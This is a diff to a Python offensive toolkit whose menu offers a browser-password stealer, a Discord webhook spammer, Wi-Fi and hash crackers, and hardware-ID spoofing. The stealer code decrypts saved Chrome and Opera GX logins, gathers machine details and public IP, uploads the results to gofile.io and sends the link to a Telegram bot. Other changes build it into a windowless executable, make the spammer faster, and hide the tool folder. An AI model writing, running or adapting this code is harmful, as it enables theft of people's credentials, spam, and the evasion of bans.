@@ -10,10 +10,15 @@ import string
 import subprocess
 import threading
 import time
+import tkinter as tk
 import webbrowser
 from datetime import datetime
-from zipfile import ZipFile, is_zipfile
+from threading import Thread
+from time import sleep
+from tkinter import *
 from tkinter import messagebox
+from zipfile import ZipFile, is_zipfile
+import _tkinter
 import cloudscraper
 import folium
 import ipinfo
@@ -29,19 +34,11 @@ from phonenumbers import geocoder, timezone, carrier
 from pywifi import const
 from pytools.proxy_scraper import SCRAPER
 from pytools.pythonic_way_proxy_checker import HttpProxyChecker, Socks4ProxyChecker, Socks5ProxyChecker
-import _tkinter
-import requests
-import colorama
-from colorama import Fore
-from threading import Thread
-import tkinter as tk
-from tkinter import *
-from time import sleep
 
 
 class usernameFinder(tk.Tk):
-
     websites = {
+        "Facebook": "https://www.facebook.com/",
         'Instagram': 'https://www.instagram.com/',
         'Github': 'https://github.com/',
         'Twitter': 'https://twitter.com/',
@@ -49,8 +46,9 @@ class usernameFinder(tk.Tk):
         'Twitch': 'https://www.twitch.tv/',
         'TikTok': 'https://www.tiktok.com/@',
         'YouTube': 'https://www.youtube.com/@',
-        'Reddit': 'https://www.reddit.com/user/'
-
+        'Reddit': 'https://www.reddit.com/user/',
+        "Flickr": "https://www.flickr.com/photos/",
+        "Pinterest": "https://www.pinterest.com/"
     }
 
     def __init__(self):
@@ -127,10 +125,18 @@ class usernameFinder(tk.Tk):
                     full_url = self.websites[website] + username
                     r = requests.get(full_url, headers={'User-Agent': 'Mozilla/5.0'})
                     if r.status_code == 200:
-                        buffer = f'Found on {website}: {full_url}' + '\n\n'
+                        buffer = f'{website}: Found {full_url}' + '\n\n'
                         self.resultBox.insert(END, buffer)
-                        self.resultBox.tag_configure("green", foreground="green")
-                        self.resultBox.tag_add("green", "1.0", "end")
+                        self.resultBox.tag_configure("green", foreground="green", selectforeground='black',
+                                                     selectbackground='white')
+                        self.resultBox.tag_add("green", '1.0', 'end')
+
+                    else:
+                        buffer = f'{website}: Not Found' + '\n\n'
+                        self.resultBox.insert(END, buffer)
+                        self.resultBox.tag_configure("red", foreground="green", selectforeground='black',
+                                                     selectbackground='white')
+                        self.resultBox.tag_add("red", '1.0', 'end')
             else:
                 self.resultBox.insert(END, 'Please enter a valid username.')
                 self.resultBox.tag_configure("red", foreground="red")
@@ -235,7 +241,7 @@ def webhookSpammer():
             else:
                 print("Payload delivered successfully, code {}.".format(res.status_code))
 
-            time.sleep(0.1)
+            time.sleep(0.05)  # 50ms
 
     except:
         moreOptions()
@@ -370,7 +376,7 @@ def wordlist():
             os.system('cls')
             os.chdir(tool_parent_dir)
             print(f'''{blue}
-          
+
 |===============|          
 |     status    |
 |===============|
@@ -392,7 +398,6 @@ import os
 import json
 import base64
 import time
-from attr import s
 from telebot import TeleBot
 import win32crypt
 import sqlite3
@@ -402,88 +407,88 @@ import requests
 import subprocess
 
 def get_pc_name_and_public_ip():
-    
+
         pc_name = os.getlogin()
-    
+
         ip = subprocess.check_output('curl -s ifconfig.me/ip', shell=True).decode()
-    
+
         cpu = subprocess.check_output('wmic cpu get name', shell=True).decode().strip().split('\n')[1]
 
         gpu = subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode().strip().split('\n')[1]
-    
+
         with open('passwords_google_database.txt', 'a') as f:
-        
+
             f.writelines(['*'*50, '\n', f'PC Name: {pc_name}', '\n', f'CPU: {cpu}', '\n', f'GPU: {gpu}', '\n', f'Public IP: {ip}', '\n' , '*'*50, '\n\n'])
 
             f.close() 
-        
+
 def send_email(download_link):
-    
+
     token = '%s'
-    
+
     chat_id = %s
-    
+
     url = f'https://api.telegram.org/bot{token}/SendMessage?chat_id={chat_id}&text={download_link}'
-    
+
     requests.get(url)
-    
+
 def upload_file(file):
-    
+
     res = subprocess.check_output('curl -s https://api.gofile.io/getServer', shell=True).decode()
-    
+
     jsdata = json.loads(res)
-    
+
     server = jsdata['data']
-    
+
     server = server['server']
-    
+
     res = subprocess.check_output(f'curl -s -F file=@{file} https://{server}.gofile.io/uploadFile', shell=True).decode()
-    
+
     jsdata = json.loads(res)
-    
+
     download_link = jsdata['data']['downloadPage']
-    
+
     send_email(download_link)
 
 class Chrome:
-    
+
     def __init__(self) -> None:
         pass
-    
+
     def get_encrypt_key(self):
-    
+
         local = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State'))
-    
-    
+
+
         with open(local, 'r') as f:
-        
+
             jsdata = json.loads(f.read())
-        
-    
+
+
         return jsdata['os_crypt']['encrypted_key']
 
 
     def decode_encrypted_key(self, encrypted_key):
-    
+
         return base64.b64decode(encrypted_key)
 
 
     def decrypt_decoded_key(self, decoded_key):
-        
+
         return win32crypt.CryptUnprotectData(decoded_key, None, None, None, 0)[1]
 
     def decrypt_saved_password(self, password, key):
-    
+
         try:
 
             iv = password[3:15]
-        
+
             password = password[15:]
 
             cipher = AES.new(key, AES.MODE_GCM, iv)
 
             return cipher.decrypt(password)[:-16].decode()
-        
+
         except:
             try:
                 return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
@@ -493,57 +498,57 @@ class Chrome:
 
 
 class Opera:
-        
+
     def __init__(self) -> None:
         pass
-    
+
     def get_encrypt_key(self):
-    
+
         local = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera GX Stable', 'Local State'))
-    
-    
+
+
         with open(local, 'r') as f:
-        
+
             jsdata = json.loads(f.read())
-        
-    
+
+
         return jsdata['os_crypt']['encrypted_key']
 
 
     def decode_encrypted_key(self, encrypted_key):
-    
+
         return base64.b64decode(encrypted_key)
 
 
     def decrypt_decoded_key(self, decoded_key):
-        
+
         return win32crypt.CryptUnprotectData(decoded_key, None, None, None, 0)[1]
 
     def decrypt_saved_password(self, password, key):
-    
+
         try:
 
             iv = password[3:15]
-        
+
             password = password[15:]
 
             cipher = AES.new(key, AES.MODE_GCM, iv)
 
             return cipher.decrypt(password)[:-16].decode()
-        
+
         except:
             try:
                 return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
             except:
                 # not supported
                 return
-            
+
 def chrome():
-    
+
     try:
-        
+
         chrome = Chrome()
-    
+
         encrypted_key = chrome.get_encrypt_key()
 
         decoded_key = chrome.decode_encrypted_key(encrypted_key)[5:]
@@ -553,29 +558,29 @@ def chrome():
         db = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'))
 
         filename = 'ChromeData.db'
-    
+
         shutil.copyfile(db, filename)
-    
+
         database = sqlite3.connect(filename)
-    
+
         if database:
-    
+
 
             cursor = database.cursor()
-        
+
             cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
-        
+
             for row in cursor.fetchall():
                 print('='*40)
-            
+
                 origin_url = row[0]
                 action_url = row[1]
                 user_or_email = row[2]
                 password = row[3]
                 password = chrome.decrypt_saved_password(password, decrypted_key)
-            
+
                 print('*'*50)
-            
+
                 result =f'''
     {colorama.Fore.GREEN}[!] Browser: {colorama.Fore.RESET}Google Chrome
     {colorama.Fore.GREEN}[+] Origin Url: {colorama.Fore.RESET}{origin_url}
@@ -583,25 +588,25 @@ def chrome():
     {colorama.Fore.GREEN}[+] Username: {colorama.Fore.RESET}{user_or_email}
     {colorama.Fore.GREEN}[+] Password: {colorama.Fore.RESET}{password}
                         '''
-            
+
                 print(result)
                 print('*'*50)
-            
+
                 with open('passwords_google_database.txt', 'a') as f:
                     f.writelines([f'[+] Browser: Google Chrome\n[+] Origin Url: {origin_url}', '\n', f'[+] Action Url: {action_url}', '\n', f'[+] Username: {user_or_email}', '\n', f'[+] Password: {password}', '\n','='*40, '\n\n'])
-              
+
         database.close()           
         os.remove('ChromeData.db')
-        
+
     except:
         pass
-    
+
 def opera():
-    
+
     try:
-        
+
         opera = Opera()
-    
+
         encrypted_key = opera.get_encrypt_key()
 
         decoded_key = opera.decode_encrypted_key(encrypted_key)[5:]
@@ -611,29 +616,29 @@ def opera():
         db = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera GX Stable', 'Login Data'))
 
         filename = 'OperaData.db'
-    
+
         shutil.copyfile(db, filename)
-    
+
         database = sqlite3.connect(filename)
-    
+
         if database:
-    
+
 
             cursor = database.cursor()
-        
+
             cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
-        
+
             for row in cursor.fetchall():
                 print('='*40)
-            
+
                 origin_url = row[0]
                 action_url = row[1]
                 user_or_email = row[2]
                 password = row[3]
                 password = opera.decrypt_saved_password(password, decrypted_key)
-            
+
                 print('*'*50)
-            
+
                 result =f'''
     {colorama.Fore.GREEN}[!] Browser: {colorama.Fore.RESET}Opera GX
     {colorama.Fore.GREEN}[+] Origin Url: {colorama.Fore.RESET}{origin_url}
@@ -641,24 +646,24 @@ def opera():
     {colorama.Fore.GREEN}[+] Username: {colorama.Fore.RESET}{user_or_email}
     {colorama.Fore.GREEN}[+] Password: {colorama.Fore.RESET}{password}
                         '''
-            
+
                 print(result)
                 print('*'*50)
-            
+
                 with open('passwords_google_database.txt', 'a') as f:
                     f.writelines([f'[+] Browser: Opera GX\n[+] Origin Url: {origin_url}', '\n', f'[+] Action Url: {action_url}', '\n', f'[+] Username: {user_or_email}', '\n', f'[+] Password: {password}', '\n','='*40, '\n\n'])
-              
+
         database.close()           
         os.remove('OperaData.db')
     except:
         pass
-    
+
 def main():
-    
+
     print('\n================= Chrome =================\n\n')
-    
+
     chrome()
-    
+
     print('\n================= Opera =================\n\n')
     opera()
 
@@ -688,65 +693,60 @@ def py2exe(fpath, icpath):
         # loop to check if python installed or not, if not then install it right now and break the loop
         while True:
             os.system('cls')
-            # check if python installed
             try:
                 subprocess.check_output('python --version', shell=True).decode()
-
             except:
                 # python is not installed, try to install it now with curl
-
-                # launch the magic to install the python
                 subprocess.check_output(
                     'curl -s https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe --output python64launcher.exe',
-                    shell=True).decode()
-
+                    shell=True)
                 subprocess.check_output('start python64launcher.exe -s')
                 time.sleep(3)
                 continue
 
             else:
-
                 break
 
         # loop to check if pyinstaller installed or not, if not then install it right now and break the loop
         while True:
             os.system('cls')
-            # check if pyinstaller installed
             try:
                 subprocess.check_output('pyinstaller --version', shell=True).decode()
-
             except:
                 # pyinstaller is not installed, try to install it now with curl
-
-                # launch the magic to install the pyinstaller
+                os.system('cls')
+                print('Installing PyInstaller ...')
                 subprocess.check_output('pip install pyinstaller', shell=True).decode()
-
                 time.sleep(3)
                 continue
 
             else:
-
                 break
 
         # loop to check if pillow installed or not, if not then install it right now and break the loop
-
         while True:
             os.system('cls')
-            # check if pillow installed
             subprocess.check_output('pip install -q pillow', shell=True).decode()
-
+            time.sleep(3)
             break
-
         os.system('cls')
 
         subprocess.check_output(f'pyinstaller --onefile {fpath} --icon {icpath} --noconsole', shell=True)
 
     except KeyboardInterrupt:
         moreOptions()
+    except subprocess.CalledProcessError:
+        print(f'\n{red}[!] Something went wrong.')
+        time.sleep(3)
+        moreOptions()
 
     else:
         os.system('cls')
-        print(f'{green}[+] Malware Path:{white} {os.path.abspath(fpath)}')
+        os.chdir('dist')
+        for file in os.listdir():
+            print(f'{green}[+] Malware Path:{white} {os.path.abspath(file)}')
+
+        os.chdir(tool_parent_dir)
         split_py = fpath.split('.')[0]
         spec = split_py + '.spec'
         shutil.rmtree('build')
@@ -863,17 +863,21 @@ def ip_lookup(ip):
 
             print(f'{green}[+] DNS Record: {white}{socket.gethostbyaddr(resolve_ip)[0]}')
 
-        except:
+        except Exception as error:
+            print(str(error))
+            pass
+        try:
+
+            latitude, longitude = tuple(latitudeandlatitude)
+            ip_geolocation = f'https://www.google.com/maps/search/?api=1&query={latitude},{longitude}'
+            webbrowser.open(ip_geolocation)
+
+        except Exception as err:
+            print(str(err))
             pass
 
-        latitude, longitude = tuple(latitudeandlatitude)
 
-        ip_geolocation = f'https://www.google.com/maps/search/?api=1&query={latitude},{longitude}'
-
-        webbrowser.open(ip_geolocation)
-
-
-def hash_cracker(hash, pwds, hash_type):
+def hash_cracker(hashtocrack, pwds, hash_type):
     os.system('cls')
     supported_hashes = {
 
@@ -887,7 +891,7 @@ def hash_cracker(hash, pwds, hash_type):
 
     if hash_type in supported_hashes:
 
-        hash_to_crack = hash
+        hash_to_crack = hashtocrack
         hashtype = supported_hashes[hash_type]
         hashCaptured = False
 
@@ -1054,9 +1058,9 @@ def crack_wifi(dictionary):
                         end='  ')
                     input(
                         f'{yellow}\n[!] Hit Enter To Save The Password Into {white}{wifi_to_crack}.txt {yellow}and Back To Main Menu')
-                    with open(f'{wifi_to_crack}.txt', 'a') as f:
-                        f.writelines(['-' * 38, f'\nWi-Fi: {wifi_to_crack}\nPassword: {pwd}\n', '-' * 38])
-                        f.close()
+                    with open(f'{wifi_to_crack}.txt', 'a') as filedata:
+                        filedata.writelines(['-' * 38, f'\nWi-Fi: {wifi_to_crack}\nPassword: {pwd}\n', '-' * 38])
+                        filedata.close()
                     main()
                 else:
                     print(
@@ -1068,10 +1072,10 @@ def restart_adapter(adapters):
     for adapter in adapters:
         try:
 
-            disable = subprocess.check_output(f'netsh interface set interface {adapter} admin=disable', shell=True,
-                                              text=True, stderr=subprocess.PIPE)
-            enable = subprocess.check_output(f'netsh interface set interface {adapter} admin=enable', shell=True,
-                                             text=True, stderr=subprocess.PIPE)
+            subprocess.check_output(f'netsh interface set interface {adapter} admin=disable', shell=True,
+                                    text=True, stderr=subprocess.PIPE)
+            subprocess.check_output(f'netsh interface set interface {adapter} admin=enable', shell=True,
+                                    text=True, stderr=subprocess.PIPE)
             time.sleep(5)
         except Exception as e:
             print(e)
@@ -1080,47 +1084,123 @@ def restart_adapter(adapters):
 
 
 def machineID_spoofer():
-    for i in range(3):
+    os.system('cls')
 
-        if i == 1:
+    dev_ids = ['DEV_0008', 'DEV_27ba', 'DEV_27bb', 'DEV_27fa', 'DEV_008', 'DEV_009', 'DEV_0018', 'DEV_0019', 'DEV_0020',
+               'DEV_0028', 'DEV_0029', 'DEV_002a', 'DEV_002b', 'DEV_002c', 'DEV_002d', 'DEV_10de002e', 'DEV_1545002f']
 
-            letters = string.ascii_letters + string.digits
-            machine_id = ''.join(random.choice(letters) for _ in range(8)) + '-' + ''.join(
-                random.choice(letters) for _ in range(4)) + '-' + ''.join(random.choice(letters) for _ in range(4)) \
-                         + '-' + ''.join(random.choice(letters) for _ in range(4)) + '-' + ''.join(
-                random.choice(letters) for _ in range(12))  # 232E5638-1D2C-4105-A38D-41F72B7E86B6
+    def spoof_display_id():
 
-            machine_id = '{%s}' % (machine_id.upper())
+        new_display_id = ''.join(random.choice(string.ascii_uppercase) for _ in range(3)) + ''.join(
+            random.choice(string.digits) for _ in range(4))
+        new_display_id = fr'MONITOR\{new_display_id}'
+        reg_key = r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\DISPLAY'
+        display = subprocess.check_output(f'reg query {reg_key}', text=True, stderr=subprocess.PIPE)
+        display_list = display.strip().split('\n')
+        for display in display_list:
+            query = subprocess.check_output(f'reg query {display}', text=True, stderr=subprocess.PIPE)
+            classInstances = query.strip().split('\n')
+            for classInstance in classInstances:
+                query = subprocess.check_output(
+                    f'reg add {classInstance} /v HardwareID /t REG_MULTI_SZ /d {new_display_id} /f',
+                    text=True, stderr=subprocess.PIPE)
+                if 'The operation completed successfully.' in query:
+                    print(f'\n{green}[+] Display ID Spoofed Successfully !')
+                else:
+                    print(f'\n{red}[-] Display ID Spoofed Failed !')
 
-            res = subprocess.check_output(
-                fr'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SQMClient /v MachineId /t REG_SZ /d {machine_id} /f',
-                shell=True, Text=True, stderr=subprocess.PIPE)
+    def spoof_gpu():
 
-        elif i == 2:
+        base_key = r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\PCI'
 
-            letters = string.ascii_letters + string.digits
-            machine_id = ''.join(random.choice(letters) for _ in range(8)) + '-' + ''.join(
-                random.choice(letters) for _ in range(4)) + '-' + ''.join(random.choice(letters) for _ in range(4)) \
-                         + '-' + ''.join(random.choice(letters) for _ in range(4)) + '-' + ''.join(
-                random.choice(letters) for _ in range(12))  # 232E5638-1D2C-4105-A38D-41F72B7E86B6
+        pnp_did = subprocess.check_output('wmic path Win32_VideoController get PNPDeviceID', shell=True,
+                                          text=True, stderr=subprocess.PIPE)
+        pnp_did = pnp_did.strip().split('PCI')[1]
 
-            res = subprocess.check_output(
-                fr'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid /t REG_SZ /d {machine_id} /f',
-                shell=True, Text=True, stderr=subprocess.PIPE)
+        full_key = base_key + pnp_did
 
-        elif i == 3:
+        query = subprocess.check_output(f'reg query {full_key}', shell=True, text=True, stderr=subprocess.PIPE)
 
-            digits = '0483A'  # 00330-80000-00000-AA808
+        q = query.strip().split('\n')
 
-            machine_id = ''.join(random.choice(digits) for _ in range(5)) + '-' + ''.join(
-                random.choice(digits) for _ in range(5)) + '-' + ''.join(random.choice(digits) for _ in range(5)) \
-                         + '-' + ''.join(random.choice(digits) for _ in range(5))
+        for _ in q:
+            if 'HardwareID' in _:
+                data = _.strip().split()
+                hardware_ids = data[-1]
+                new_hardware_id = hardware_ids.split('\\')
+                did = new_hardware_id[1].split('&')
+                for _ in did:
+                    if 'DEV' in _:
+                        current_did = _.strip()
 
-            res = subprocess.check_output(
-                fr'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion /v ProductId /t REG_SZ /d {machine_id} /f',
-                shell=True, Text=True, stderr=subprocess.PIPE)
+        new_hardware_id = hardware_ids.replace(current_did, random.choice(dev_ids))
 
-    return True
+        spoof = subprocess.check_output(f'reg add {full_key} /v HardwareID /t REG_MULTI_SZ /d {new_hardware_id} /f',
+                                        text=True, stderr=subprocess.PIPE)
+
+        if 'The operation completed successfully.' in spoof:
+            print(f'\n{green}[+] GPU Spoofed Successfully !')
+
+    def generate_machine_id(lenghts):
+        letters = string.ascii_letters + string.digits
+
+        machine_id = '-'.join(''.join(random.choice(letters) for _ in range(length)) for length in lenghts)
+
+        machine_id = '{%s}' % machine_id
+
+        return machine_id
+
+    def set_registry_keys(registry_keys):
+
+        statue = None
+        for key, value in registry_keys.items():
+            try:
+                res = subprocess.check_output(
+                    f'reg add {key} /v {value["name"]} /t REG_SZ /d {value["value"]} /f',
+                    shell=True, text=True, stderr=subprocess.PIPE)
+                if 'The operation completed successfully.' in res:
+                    print(f'\n{green}[+] {value["name"]} Spoofed Successfully !')
+                    statue = True
+                else:
+                    statue = False
+            except Exception as e:
+                if 'ProductId' in str(e):
+                    print(f'\n{red}[!] Couldn\'t Spoof ProductId !')
+                    statue = True
+                elif 'HwProfileGuid' in str(e):
+                    print(f'\n{red}[!] Couldn\'t Spoof HwProfileGuid !')
+                    statue = True
+
+                else:
+                    statue = False
+
+        return statue
+
+    registry_keys = {
+        r'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SQMClient': {"name": "MachineId",
+                                                             "value": generate_machine_id([8, 4, 4, 4, 12]).lower()},
+        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography": {"name": "MachineGuid",
+                                                                "value": generate_machine_id([8, 4, 4, 4, 12]).lower()},
+        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion": {"name": "ProductId",
+                                                                             "value": generate_machine_id(
+                                                                                 [5, 5, 5, 5])},
+        r'"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001"': {
+            "name": "HwProfileGuid",
+            "value": generate_machine_id([8, 4, 4, 4, 12]).lower()}
+    }
+
+    if set_registry_keys(registry_keys):
+        spoof_display_id()
+        spoof_gpu()
+        os.chdir(path_to_assistfolder)
+        os.chdir('tools')
+        os.chdir('hwids')
+        mainfile = os.listdir()[0]
+        subprocess.check_output(f'start {mainfile}', shell=True)
+        return True
+
+    else:
+        return False
 
 
 def hwid_spoofer():
@@ -1212,10 +1292,10 @@ def proxy_gen():
     os.system('cls')
     os.chdir(tool_parent_dir)
     threads = []
-    p1 = Thread(target=SCRAPER.proxy_1)
-    p2 = Thread(target=SCRAPER.proxy_2)
-    p3 = Thread(target=SCRAPER.proxyScraper)
-    p4 = Thread(target=SCRAPER.proxyScraper_2)
+    p1 = Thread(target=SCRAPER().proxy_1)
+    p2 = Thread(target=SCRAPER().proxy_2)
+    p3 = Thread(target=SCRAPER().proxyScraper)
+    p4 = Thread(target=SCRAPER().proxyScraper_2)
 
     p1.start()
     threads.append(p1)
@@ -1230,11 +1310,12 @@ def proxy_gen():
     threads.append(p4)
     time.sleep(4)
 
-    for thread in threads:
+    for thread in threads:  # this simply tells python interpreter wait to finish all the threads then continue Execute
+        # The Code
         thread.join()
 
     try:
-        proxies = SCRAPER.proxies
+        proxies = SCRAPER().proxies
         b = len(proxies)
         new = [prx for prx in dict.fromkeys(proxies)]
         a = len(new)
@@ -1367,7 +1448,7 @@ def network_optimization():
         cls()
         if 'The operation completed successfully.' in res:
             print(f'''\n{lmagenta}[!] The Following Properties Has Been Changed:
-                  
+
         {green}Maximum  Speed  Set To ==> {white}True
         {green}Shutdown Speed  Set To ==> {white}False
         {green}TCP Offload     Set To ==> {white}Rx & Tx Enabled
@@ -1538,7 +1619,7 @@ def discordHunter(email, password):
              / ___ |/ /_/ / ,< / /_/ / /  __(__  |__  ) 
             /_/  |_/ .___/_/|_|\__,_/_/\___/____/____/  
                   /_/ 
-                      
+
             {yellow}[!] Checking User      : [{white}{username}{yellow}]
             {green}[+] Captured Users     : [{white}{len(capturedUsers)}{green}]
             {red}[-] Unavailable Users  : [{white}{len(falseUsers)}{red}]
@@ -1605,10 +1686,10 @@ def moreOptions():
         try:
 
             print(f'''
-                             
-{green}[10] {lcyan}Discord Usernames Checker                                                 {green}[22] {lcyan}Zip File {lcyan}Password Cracker
-{green}[11] {lcyan}Discord Webhook Spammer                                                   {green}[23] {lcyan}IP & Domain LOOKUP
-{green}[12] {lcyan}Malware {green}(Steal Google Chrome And Opera GX Passwords)                      {green}[24] {lcyan}Phone Number Tracker
+
+{green}[10] {lcyan}Discord Usernames Checker                                                 {green}[23] {lcyan}Zip File {lcyan}Password Cracker
+{green}[11] {lcyan}Discord Webhook Spammer                                                   {green}[24] {lcyan}IP & Domain LOOKUP
+{green}[12] {lcyan}Malware {green}(Steal Google Chrome And Opera GX Passwords)                      {green}[25] {lcyan}Phone Number Tracker
 {green}[13] {lcyan}Extract All {green}WI-FI Passwords{lcyan} That You Have Connected Recently              {green}[99] {lcyan}Main Menu      
 {green}[14] {lcyan}Most Nmap Commands Used By {green}(Black Hat Team)
 {green}[15] {lcyan}Wordlist Generator {green}(Brute Force And Dictionary Attack){rescolor}
@@ -1617,7 +1698,8 @@ def moreOptions():
 {green}[18] {lcyan}7z File Password Cracker
 {green}[19] {lcyan}Get HWID
 {green}[20] {lcyan}Spoof HWID
-{green}[21] {lcyan}Wifi Cracker
+{green}[21] {lcyan}Spoof Disk HWID
+{green}[22] {lcyan}Wifi Cracker
 
              ''')
             cmd = input(f'{lcyan}!{green}]==={lcyan}{terminal * 13}{green}==>{white} ')
@@ -1626,9 +1708,9 @@ def moreOptions():
                 os.system('cls')
                 while True:
                     print(f'''{yellow}\n[!] In Order To Use This Tool You Need To Do This:{white}
-              
-                            *) Go to https://temp-mail.org/
-                            *) Copy The Email as it shown at the website
+
+                            *) Go to https://www.emailnator.com/
+                            *) Make Sure The Email Ends With @gmail.com, Click Go
                             *) Go To https://discord.com/register And Create The Account
                             *) Go To https://discord.com/login and Login Into Discord
                             *) Login With Account In This Tool
@@ -1714,7 +1796,7 @@ def moreOptions():
                 os.system('cls')
                 try:
                     print(f'''{yellow}[!] {white}Supported Hash Types:
-                          
+
             {blue}[1] {white}sha256
             {blue}[2] {white}sha1
             {blue}[3] {white}sha224
@@ -1764,16 +1846,23 @@ def moreOptions():
                     mssg = hwid_spoofer()
                     machine_id = machineID_spoofer()
                     if mssg and machine_id:
-                        print(f'\n{green}[+] HWID Spoofed Successfuly.\n')
+                        print(f'\n{green}[+] MAC Address Spoofed Successfully.\n')
+                        print(f'\n{green}[+] HWIDs Spoofed Successfully.\n')
                         print(f'{green}[+] New HWID is: {get_hwid()}\n')
                         print(f'{yellow}[-] Old HWID is: {hwid}\n')
                     else:
-                        print(f'{red}[-] There Was An Error While Spoofing HWID.')
+                        print(f'{red}[-] There Was An Error While Spoofing HWIDs.')
                     input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                 except KeyboardInterrupt:
                     moreOptions()
 
             if cmd == '21':
+                os.chdir(path_to_assistfolder)
+                os.chdir('tools')
+                os.chdir('diskids')
+                mainfile = os.listdir()[0]
+                subprocess.check_output(f'start {mainfile}', shell=True)
+            if cmd == '22':
                 os.system('cls')
                 try:
 
@@ -1786,7 +1875,7 @@ def moreOptions():
                 except KeyboardInterrupt:
                     moreOptions()
 
-            if cmd == '22':
+            if cmd == '23':
                 os.system('cls')
                 try:
 
@@ -1803,18 +1892,18 @@ def moreOptions():
                 except KeyboardInterrupt:
                     moreOptions()
 
-            if cmd == '23':
+            if cmd == '24':
                 os.system('cls')
                 try:
 
-                    ip = input(fr'\n{green}[+] IP Address \ Domain Name:{white} ')
+                    ip = input(f'\n{green}[+] IP Address OR Domain Name:{white} ')
                     if ip:
                         ip_lookup(ip)
                     input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                 except KeyboardInterrupt:
                     moreOptions()
 
-            if cmd == '24':
+            if cmd == '25':
                 os.system('cls')
                 try:
 
@@ -1835,12 +1924,13 @@ def moreOptions():
 
 
 def remove_tools():
-    os.chdir(path_to_iqmark)
+    os.chdir(path_to_assistfolder)
     shutil.rmtree('tools')
 
 
 def main():
-    os.chdir(path_to_iqmark)
+    global username
+    os.chdir(path_to_assistfolder)
     try:
 
         while True:
@@ -1862,7 +1952,7 @@ def main():
                               {green}|    {green}[+] Codename    : {lcyan}{codename}                          {green}|
                               {green}|    {green}[+] Nationality : {lcyan}Iraq                        {green}|                
         ================================================================================================
-                                                                            
+
         {green}[01] {lcyan}IDM Trial Reset                                 {green}[08] {lcyan}YinOmega
         {green}[02] {lcyan}Clean Your System With One Hit                  {green}[09] {lcyan}PUBLIC IP
         {green}[03] {lcyan}Activate Windows {green}(10 & 11)                      {green}[10] {lcyan}SYSTEM INFORMATION
@@ -1939,6 +2029,7 @@ def main():
     except KeyboardInterrupt:
         os.system('cls')
         print(f'\n{lmagenta}See You Later {green}Mr.{username}\n')
+        time.sleep(3)
 
 
 if __name__ == '__main__':
@@ -1955,25 +2046,27 @@ if __name__ == '__main__':
     rescolor = Fore.RESET
     tool_parent_dir = os.getcwd()
     username = os.getlogin()
+    testfold = f'C:/Users/{username}/AppData/Roaming/'
     path_to_roaming_windows = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows'
-    path_to_iqmark = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/iqmark'
+    path_to_assistfolder = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/assistfolder'
     zipfile_password = 'apkaless@iraq@2003@sabah@@2003'
     os.chdir(path_to_roaming_windows)
 
-    if os.path.exists('iqmark'):
-        os.chdir('iqmark')
+    if os.path.exists('assistfolder'):
+        os.chdir('assistfolder')
         if len(os.listdir()) <= 0:
             os.chdir(tool_parent_dir)
             with py7zr.SevenZipFile('tools.7z', mode='r', password=zipfile_password) as zf:
-                zf.extractall(path_to_iqmark)
+                zf.extractall(path_to_assistfolder)
         else:
             pass
     else:
-        os.mkdir('iqmark')
+        os.mkdir('assistfolder')
+        os.system('attrib /S /D +H assistfolder')
 
     os.chdir(tool_parent_dir)
     with py7zr.SevenZipFile('tools.7z', mode='r', password=zipfile_password) as zf:
-        zf.extractall(path_to_iqmark)
+        zf.extractall(path_to_assistfolder)
 
     version_info = platform.win32_ver()[0]
 
